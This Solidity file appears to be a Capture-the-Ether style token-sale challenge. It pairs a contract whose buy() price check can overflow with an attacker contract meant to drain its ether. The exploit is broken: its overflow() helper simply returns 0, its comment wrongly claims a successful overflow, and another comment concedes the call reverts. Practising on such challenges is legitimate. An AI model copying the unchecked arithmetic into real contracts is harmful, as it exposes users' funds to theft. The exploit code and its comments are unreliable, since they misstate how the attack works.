pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract drain {
    TokenSaleChallenge public tokenCon;

    function drain(address conAddress) public {
        tokenCon = TokenSaleChallenge(conAddress);
    }

    // successfully overflows the uint256 type as TokenSaleChallenge doesn't
    // handle overflows or underflows
    function overflow() public pure returns (uint256 over) {
        uint256 max = 2**256 - 1;
        return max + 1;
    }


    // currently resulting in a revert, need to determine the failure point
    function withdrawFromCon() public payable {
        uint256 depAmount = overflow();
        tokenCon.buy.value(depAmount * 1 ether)(depAmount);
        tokenCon.sell(depAmount);
    }

    function receive() external payable {

    }
}
